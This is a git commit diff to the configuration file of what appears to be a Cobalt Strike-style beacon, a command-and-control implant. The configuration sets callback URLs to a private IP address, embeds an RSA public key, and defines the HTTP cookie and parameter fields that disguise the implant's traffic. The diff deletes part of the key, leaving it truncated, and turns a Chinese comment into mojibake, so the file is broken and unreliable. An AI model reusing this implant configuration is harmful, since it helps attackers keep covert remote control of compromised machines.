5ca85d90dbbaaff6eb8ce8431987488414774e17
M0nster3 <68884539+M0nster3@users.noreply.github.com>
2024-08-07 01:12:08 +0800

    Update Config.c
    config

--- Beacon/Config.c
+++ Beacon/Config.c
@@ -5,12 +5,10 @@ const char Http_get_uri[] = "http://10.10.100.74:80/www/handle/doc";
 const char Http_Post_uri[] = "http://10.10.100.74:80/IMXo";
 unsigned char* pub_key_str ="-----BEGIN PUBLIC KEY-----\n"
 "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCTWvb4Msb5iR3d+0DbOnj1HJ1ewGTxZgCyCxqT\n"
-"zbjsHSeGpTPJbI1UeAZZgQjKyua28IkTDYYcVZ06SbPlnQqA0smr94QoZTtjUYx7/mtomx8bOc5J\n"
-"SXBnwM6TG24JPFGiDGvngfb+YydXYy3yngwZtsc/O5pwN2IRAYWS2p8GoQIDAQAB\n"
 "-----END PUBLIC KEY-----\n";
 
 unsigned char* metadata_prepend = "SESSIONID=";
-unsigned char* metadata_header = "Cookie:"; //在profile中不用加:号
+unsigned char* metadata_header = "Cookie:"; //脭脷profile脰脨虏禄脫脙录脫:潞脜
 unsigned char* Response_prepend = "data=";
 unsigned char* Response_append = "%%";
 unsigned char* Http_post_id_prepend = "user=";
